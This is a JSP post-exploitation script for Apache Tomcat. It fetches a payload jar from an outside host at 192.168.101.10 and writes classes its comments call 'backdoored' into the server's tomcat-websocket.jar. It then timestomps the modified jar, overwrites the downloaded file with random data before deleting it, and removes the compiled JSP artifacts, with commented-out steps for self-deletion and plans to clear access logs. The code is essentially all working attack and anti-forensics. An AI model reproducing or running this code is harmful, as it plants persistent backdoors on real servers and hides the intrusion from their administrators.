<%@ page import="java.io.*, java.net.URL, java.nio.file.*, java.nio.file.attribute.*, java.util.jar.*, java.util.zip.*, java.util.*, java.util.Enumeration, java.security.SecureRandom" %>
<%
class Helper {
    public void copyFile(String sourcePath, File targetPath) throws IOException {
        Path srcPath = Paths.get(sourcePath);
        Path tgtPath = targetPath.toPath();
        Files.copy(srcPath, tgtPath, StandardCopyOption.REPLACE_EXISTING);
    }

    public void transferClasses(File sourceFile, File targetJarFile) throws IOException {
        JarFile sourceJar = new JarFile(sourceFile);
//        JarEntry jarEntryA = sourceJar.getJarEntry("A.class");
//        JarEntry jarEntryB = sourceJar.getJarEntry("B.class");
        JarEntry jarEntryC = sourceJar.getJarEntry("C.class");
        JarEntry jarEntryWsSci = sourceJar.getJarEntry("WsSci.class");

//      InputStream isA = sourceJar.getInputStream(jarEntryA);
//      InputStream isB = sourceJar.getInputStream(jarEntryB);
        InputStream isC = sourceJar.getInputStream(jarEntryC);
        InputStream isWsSci = sourceJar.getInputStream(jarEntryWsSci);

        JarFile targetJar = new JarFile(targetJarFile);
        File tempJarFile = new File("/tmp/temp-tomcat-websocket.jar");
        JarOutputStream tempJarStream = new JarOutputStream(new FileOutputStream(tempJarFile));

        // Copy original entries (skip WsSci.class we are replacing it)
        Enumeration<JarEntry> jarEntries = targetJar.entries();
        while (jarEntries.hasMoreElements()) {
            JarEntry jarEntry = jarEntries.nextElement();
            if (!jarEntry.getName().equals("org/apache/tomcat/websocket/server/WsSci.class")) {
                InputStream in = targetJar.getInputStream(jarEntry);
                tempJarStream.putNextEntry(new JarEntry(jarEntry.getName()));
                int length;
                byte[] buffer = new byte[1024];
                while ((length = in.read(buffer)) > 0) {
                    tempJarStream.write(buffer, 0, length);
                }
                tempJarStream.closeEntry();
                in.close();
            }
        }

        // Add backdoored classes
//      writeClass(tempJarStream, isA, "org/apache/tomcat/websocket/server/A.class");
//      writeClass(tempJarStream, isB, "org/apache/tomcat/websocket/server/B.class");
        writeClass(tempJarStream, isC, "org/apache/tomcat/websocket/server/C.class");
        writeClass(tempJarStream, isWsSci, "org/apache/tomcat/websocket/server/WsSci.class");

        tempJarStream.close();
        targetJar.close();
        sourceJar.close();

        // Replace the org .jar file with the temp one
        Files.move(tempJarFile.toPath(), targetJarFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
    }

    private void writeClass(JarOutputStream jarStream, InputStream in, String className) throws IOException {
        jarStream.putNextEntry(new JarEntry(className));
        int length;
        byte[] buffer = new byte[1024];
        while ((length = in.read(buffer)) > 0) {
            jarStream.write(buffer, 0, length);
        }
        jarStream.closeEntry();
        in.close();
    }

    public void relocateAndStomp(String sourcePath, String timestampPath, String destinationPath) throws IOException {
        Files.move(Paths.get(sourcePath), Paths.get(destinationPath), StandardCopyOption.REPLACE_EXISTING);
        BasicFileAttributes sourceAttributes = Files.readAttributes(Paths.get(timestampPath), BasicFileAttributes.class);
        FileTime createdTime = sourceAttributes.creationTime();
        FileTime modifiedTime = sourceAttributes.lastModifiedTime();
        Files.setAttribute(Paths.get(destinationPath), "basic:creationTime", createdTime);
        Files.setAttribute(Paths.get(destinationPath), "basic:lastModifiedTime", modifiedTime);
    }

    // Why just delete when we can overwrite
    public void removeTemporaryFiles(String... filePaths) throws IOException {
        SecureRandom random = new SecureRandom();
        for (String filePath : filePaths) {
            File tempFile = new File(filePath);
            if (tempFile.exists() && tempFile.isFile()) {
                try (FileOutputStream fos = new FileOutputStream(tempFile)) {
                    byte[] buffer = new byte[4096];
                    long remaining = tempFile.length();
                    while (remaining > 0) {
                        int lengthToWrite = (int) Math.min(buffer.length, remaining);
                        random.nextBytes(buffer);
                        fos.write(buffer, 0, lengthToWrite);
                        remaining -= lengthToWrite;
                    }
                }
                tempFile.delete();
            }
        }
    }

    public void JasperCleanUp(String fileNameOfJsp, String catalinaHome) throws IOException {
        String contextPath = request.getContextPath();
        String javaPath = catalinaHome + "/work/Catalina/localhost/" + contextPath + "/org/apache/jsp/" + fileNameOfJsp + "_jsp.java";
        String classPath = catalinaHome + "/work/Catalina/localhost/" + contextPath + "/org/apache/jsp/" + fileNameOfJsp + "_jsp.class";
        String helperClassPath = catalinaHome + "/work/Catalina/localhost/" + contextPath + "/org/apache/jsp/" + fileNameOfJsp + "_jsp$1Helper.class";
        removeTemporaryFiles(javaPath, classPath, helperClassPath);
    }

}

Helper helper = new Helper();
String catalinaHome = System.getenv("CATALINA_HOME");

// Download file location
File sourceFile = new File("/tmp/tomcat-ant-download.jar");

// Location of copied legit library
File targetJarFile = new File("/tmp/tomcat-websocket-moved.jar");

String jspLoc = new File(application.getRealPath(request.getServletPath())).getAbsolutePath();

try {
    String sourceURL = "http://192.168.101.10/tomcat-ant.jar";
    URL url = new URL(sourceURL);
    InputStream is = url.openStream();
    String targetFilePath = sourceFile.getPath();
    OutputStream outputStream = new FileOutputStream(new File(targetFilePath));

    byte[] buffer = new byte[4096];
    int length = 0;
    while ((length = is.read(buffer)) > 0) {
        outputStream.write(buffer, 0, length);
    }

    is.close();
    outputStream.close();

    out.println("Fetched payload<br>");
    out.println("JSP Location: " + jspLoc + "<br>");

    // Copy clean to tmp
    helper.copyFile(catalinaHome + "/lib/tomcat-websocket.jar", targetJarFile);
    helper.transferClasses(sourceFile, targetJarFile);

    // Timestomp for testing in tmp move back to lib in future
    // sourcefile timestampsource destination
    // change from tmp to final location 
    helper.relocateAndStomp(targetJarFile.getPath(), catalinaHome + "/lib/tomcat-websocket.jar", "/tmp/stomped-tomcat-websocket.jar");

    // Clean up downloaded container with backdoor
    helper.removeTemporaryFiles(sourceFile.getPath());
    
    // Uncomment to self delete JSP
    //helper.removeTemporaryFiles(jspLoc);
    
    // Clean up files in Jasper
    // work/Catalina/localhost/XYZ/org/apache/jsp/JSPNAME_jsp.class java _jsp$1Helper.class
    // Alternatively, modify web.xml set keepGenerated false in jasper section
    String uri = request.getRequestURI();
    String fileNameOfJsp = uri.substring(uri.lastIndexOf("/") + 1, uri.lastIndexOf("."));
    helper.JasperCleanUp(fileNameOfJsp, catalinaHome);

    //Add access log clearing

    out.println("Manually move /tmp/stomped-tomcat-websocket.jar > lib/tomcat-websocket.jar<br>");
    out.println("Edit relocateandstomp above to this automatically<br>");
} catch (Exception e) {
    out.println("Error: " + e.getMessage());
    e.printStackTrace(new PrintWriter(out));
}
%>
